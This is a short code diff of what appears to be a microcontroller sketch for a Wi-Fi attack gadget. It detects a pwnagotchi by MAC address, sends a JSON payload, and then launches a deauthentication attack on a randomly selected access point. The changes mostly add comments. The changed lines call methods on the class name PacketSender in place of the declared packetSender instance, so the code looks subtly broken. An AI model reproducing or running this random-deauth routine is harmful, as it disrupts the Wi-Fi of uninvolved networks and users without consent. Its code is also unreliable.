@@ -9,16 +9,21 @@ PacketSender packetSender;
 DeauthAttack deauthAttack;
 
 void setup() {
-    Serial.begin(115200);
-    deauthAttack.addToWhitelist("SSID");
+    // more stuff here
+    Serial.begin(115200); // this is the rate for the serial monitor
+    deauthAttack.addToWhitelist("SSID"); // set your ssid you want to use
 }
 
 void loop() {
+    // get local payload from local pwnagotchi
     pwnagotchi.detectPwnagotchi("de:ad:be:ef:de:ad");
 
+    // send payload
     const char* essid = "de:ad:be:ef:de:ad";
-    String jsonPayload = packetSender.sendJsonPayload(essid);
+    String jsonPayload = PacketSender.serializeJsonPayload(essid);
+    PacketSender.sendJsonPayload(jsonPayload);
 
+    // deauth a random ap
     deauthAttack.selectRandomAP();
     deauthAttack.startRandomDeauth();
 }
